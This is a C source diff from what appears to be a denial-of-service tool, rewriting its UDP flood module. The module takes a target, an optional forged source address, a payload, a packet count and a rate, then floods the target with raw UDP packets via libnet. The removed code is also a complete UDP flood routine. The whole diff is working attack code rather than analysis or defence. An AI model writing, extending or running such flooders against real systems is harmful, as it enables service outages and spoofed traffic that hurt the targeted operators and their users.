@@ -24,19 +24,24 @@
  *****************************************************************************/
 
 #include <config.h>
+#include "dosconfig.h"
 #include "dosis.h"
+#include "ip.h"
+#include "lnet.h"
+#include "log.h"
+#include "payload.h"
+#include "tea.h"
 
 typedef struct _tag_UDP_CFG {
   /* options */
   INET_ADDR          shost;
   INET_ADDR          dhost;
-  int                flags;
 
   /* parameters */
   unsigned           npackets;
-  char               req;
-  unsigned           req_size;
   double             hitratio;
+  char              *payload;
+  unsigned           payload_size;
 
   /* other things */
   pthreadex_timer_t  timer;
@@ -77,7 +82,6 @@ DBG("[%s]   VEREDICT: %d (%x, %d) [%x, %d]",
 static void udp__thread(THREAD_WORK *tw)
 {
   UDP_CFG *tu = (UDP_CFG *) tw->data;
-  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
   int i;
 
   DBG("[%02u] Started sender thread", tw->id);
@@ -90,151 +94,153 @@ static void udp__thread(THREAD_WORK *tw)
       if(pthreadex_timer_wait(&(tu->timer)) < 0)
         ERR("Error at pthreadex_timer_wait(): %s", strerror(errno));
 
-    /* build TCP packet with payload (if requested) */
+    /* build UDP packet with payload (if requested) */
     DBG("[%02u] Sending %d packet(s)...", tw->id, tu->npackets);
     for(i = 0; i < tu->npackets; i++)
-    {
-      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
-      ln_send_packet(tu->lnc,
-                     &tu->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
-                     &tu->dhost.addr.in.inaddr, tu->dhost.port,
-                     TH_SYN, 13337,
-                     seq, 0,
-                     NULL, 0);
-    }
+      ln_send_udp_packet(tu->lnc,
+                         &tu->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
+                         &tu->dhost.addr.in.inaddr, tu->dhost.port,
+                         tu->payload, tu->payload_size);
   }
 }
 
-void attack_udpflood__thread_cleanup(UDPFLOOD_TWORK *uw)
+/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ * CONFIGURATION. 
+ *   Is important to consider that this function could be
+ *   called several times during thread live: initial
+ *   configuration and reconfigurations.
+ *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
+
+static int udp__configure(THREAD_WORK *tw, SNODE *command)
 {
-  thread_timer_stats_libnet(uw->ln, &uw->w->stats);
+  UDP_CFG *tu = (UDP_CFG *) tw->data;
+  SNODE *cn;
+  char *s;
 
-  if(uw->ln)
-    libnet_destroy(uw->ln);
-}
-
-void attack_udpflood__thread(THREAD_WORK *w)
-{
-  UDPFLOOD_TWORK uw;
-  int r;
-  u_int32_t sport, dport, seq;
-  char errbuf[LIBNET_ERRBUF_SIZE];
-  libnet_ptag_t udp_p, ipv4_p;
-  unsigned char *pl;
-  unsigned int plsz;
-  u_int64_t cpacket;
-
-  /* initialize thread work data */
-  memset(&uw, 0, sizeof(UDPFLOOD_TWORK));
-  uw.w = w;
-
-  /* initialize thread */
-  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &r);
-  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &r);
-  pthread_cleanup_push((void *) attack_udpflood__thread_cleanup, &uw);
-
-  /* wait 4 start */
-  pthreadex_barrier_wait(w->start);
-
-  /* initialize libnet */
-  DBG1("[%02u] Initializing libnet.", w->id);
-  if((uw.ln = libnet_init(LIBNET_RAW4, NULL, errbuf)) == NULL)
-    FAT("[%02u] Cannot initialize libnet: %s", w->id, errbuf);
-  if(libnet_seed_prand(uw.ln) < 0)
-    FAT("[%02u] Faild to initialize libnet pseudorandom number generator.", w->id);
-
-  /* set how many packets will be sent by this thread */
-  uw.npackets = opts.packets / ((u_int64_t) opts.c);
-  if(w->id == 0)
-    uw.npackets += opts.packets - (uw.npackets * ((u_int64_t) opts.c));
-
-  /* three! two! one! zero! go go go gooooo! */
-  udp_p = LIBNET_PTAG_INITIALIZER;
-  ipv4_p = LIBNET_PTAG_INITIALIZER;
-  seq = libnet_get_prand(LIBNET_PRu32);
-  sport = opts.sport;
-  dport = opts.dport;
-  pl    = opts.payload;
-  plsz  = opts.payload_size;
-
-  while(!opts.finalize)
+  /* first initialization (specialized work thread data) */
+  if(tu == NULL)
   {
-    /* wait for work */
-    if(!w->id)
-    {
-      pthreadex_flag_wait(&attack_flag);
-      DBG1("[%02u] Burst...", w->id);
-    }
+    if((tu = calloc(1, sizeof(UDP_CFG))) == NULL)
+      D_FAT("[%02d] No memory for UDP_CFG.", tw->id);
+    tw->data = (void *) tu;
 
-    /* sync threads */
-    pthreadex_barrier_wait(&burst_barrier);
+    /* initialize libnet */
+    DBG("[%02u] Initializing libnet.", tw->id);
+    if((tu->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
+      D_FAT("[%02d] No memory for LN_CONTEXT.", tw->id);
+    ln_init_context(tu->lnc);
 
-    /* launch packets */
-    DBG2("[%02u]   Sending %lld packets.", w->id, uw.npackets);
-    for(cpacket = 0; cpacket < uw.npackets; cpacket++)
-    {
-      if(opts.rsport)
-        sport = libnet_get_prand(LIBNET_PRu16);
-      if(opts.rdport)
-        dport = libnet_get_prand(LIBNET_PRu16);
-      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
-
-      udp_p = libnet_build_udp(
-                  sport,               /* src port        */
-                  dport,               /* dst port        */
-                  LIBNET_UDP_H + plsz, /* pkt_len         */
-                  0,                   /* checksum        */
-                  pl,                  /* payload         */
-                  plsz,                /* payload_size    */
-                  uw.ln,               /* libnet context  */
-                  udp_p);              /* protocol tag    */
-      if(udp_p == -1)
-        FAT("Can't build UDP header: %s", libnet_geterror(uw.ln));
-
-      ipv4_p = libnet_build_ipv4(
-                   LIBNET_IPV4_H +      /* pkt_len        */
-                   LIBNET_UDP_H +
-                   plsz,
-                   0x00,                /* TOS            */
-                   0x0000,              /* ID             */
-                   0x0000,              /* frag           */
-                   0xf0,                /* ttl            */
-                   IPPROTO_UDP,         /* proto          */
-                   0,                   /* checksum       */
-                   opts.shost.s_addr,   /* shost          */
-                   opts.dhost.s_addr,   /* dhost          */
-                   NULL,                /* *payload       */
-                   0,                   /* payload size   */
-                   uw.ln,               /* libnet context */
-                   ipv4_p);             /* protocol tag   */
-      if(ipv4_p == -1)
-        FAT("Can't build IP header: %s", libnet_geterror(uw.ln));
-
-      if(libnet_write(uw.ln) == -1)
-        FAT("[%02u] Error sending packet: %s", w->id, libnet_geterror(uw.ln));
-    }
+    pthreadex_timer_init(&(tu->timer), 0.0);
   }
 
-  pthread_cleanup_pop(1);
+  /* read from SNODE command parameters */
+  cn = command->command.thc.to->to.pattern;
+  if(cn->type != TYPE_PERIODIC)
+    FAT("%d: Uknown pattern %d.", cn->line, cn->type);
+  
+  tu->hitratio = tea_get_float(cn->pattern.periodic.ratio);
+  tu->npackets = tea_get_int(cn->pattern.periodic.n);
+  if(tu->hitratio < 0)
+    FAT("%d: Bad hit ratio '%f'.", cn->line, tu->hitratio);
+  if(tu->npackets <= 0)
+    FAT("%d: Bad number of packets '%d'.", cn->line, tu->npackets);
+
+  /* read from SNODE command options */
+  for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
+    switch(cn->type)
+    {
+      case TYPE_OPT_SRC:
+        s = tea_get_string(cn->option.addr);
+        if(ip_addr_parse(s, &tu->shost))
+          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
+        free(s);
+        if(cn->option.port)
+          ip_addr_set_port(&tu->shost, tea_get_int(cn->option.port));
+        break;
+
+      case TYPE_OPT_DST:
+        s = tea_get_string(cn->option.addr);
+        if(ip_addr_parse(s, &tu->dhost))
+          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
+        free(s);
+        if(cn->option.port)
+          ip_addr_set_port(&tu->dhost, tea_get_int(cn->option.port));
+        break;
+
+      case TYPE_OPT_PAYLOAD_FILE:
+      case TYPE_OPT_PAYLOAD_RANDOM:
+      case TYPE_OPT_PAYLOAD_STR:
+        payload_get(cn, &tu->payload, &tu->payload_size);
+        break;
+
+      default:
+        FAT("%d: Uknown option %d.", cn->line, cn->type);
+    }
+
+  /* configure timer */
+  if(tu->hitratio > 0)
+    pthreadex_timer_set_frequency(&(tu->timer), tu->hitratio);
+
+  /* configure src address (if not defined) */
+  if(tu->dhost.type == INET_FAMILY_NONE)
+    FAT("I need a target address.");
+  if(tu->shost.type == INET_FAMILY_NONE)
+  {
+    DOS_ADDR_INFO *ai;
+    if((ai = dos_get_interface(&tu->dhost)) == NULL)
+    {
+      char buff[255];
+      ip_addr_snprintf(&tu->shost, sizeof(buff), buff);
+      WRN("Cannot find a suitable source address for '%s'.", buff);
+    } else
+      ip_addr_copy(&tu->shost, &ai->addr);
+  }
+
+  /* (debug) print configuration */
+  {
+    char buff[255];
+
+    DBG2("[%d] config.periodic.n     = %d", tw->id, tu->npackets);
+    DBG2("[%d] config.periodic.ratio = %d", tw->id, tu->hitratio);
+
+    ip_addr_snprintf(&tu->shost, sizeof(buff)-1, buff);
+    DBG2("[%d] config.options.shost  = %s", tw->id, buff);
+    ip_addr_snprintf(&tu->dhost, sizeof(buff)-1, buff);
+    DBG2("[%d] config.options.dhost  = %s", tw->id, buff);
+  }
+
+  return 0;
 }
 
-int attack_udpflood__go2work(void)
+static void udp__cleanup(THREAD_WORK *tw)
 {
-  /* flag that will keep attack threads waiting for work */
-  return pthreadex_flag_up(&attack_flag);
+  UDP_CFG *tc = (UDP_CFG *) tw->data;
+
+  /* collect libnet data */
+  ln_destroy_context(tc->lnc);
+  free(tc->lnc);
+  pthreadex_timer_destroy(&tc->timer);
+
+  if(tc->payload)
+  {
+    free(tc->payload);
+    tc->payload = NULL;
+  }
+  free(tc);
+  tw->data = NULL;
+
+  DBG("[%d] Finalized.", tw->id);
 }
 
-void attack_udpflood(TTIMER_STATS *ttstats)
-{
-  /* flag that will keep attack threads waiting for work */
-  pthreadex_flag_init(&attack_flag, 0);
+/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ * UDP TEA OBJECT
+ *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-  /* barrier to synchronize threads in bursts */
-  pthreadex_barrier_init(&burst_barrier, opts.c);
-
-  /* launch attack */
-  thread_timer(attack_udpflood__go2work,
-               attack_udpflood__thread,
-               ttstats);
-}
+TEA_OBJECT teaUDP = {
+  .name         = "UDP",
+  .configure    = udp__configure,
+  .cleanup      = udp__cleanup,
+  .listen_check = udp__listen_check,
+  .thread       = udp__thread,
+};
 
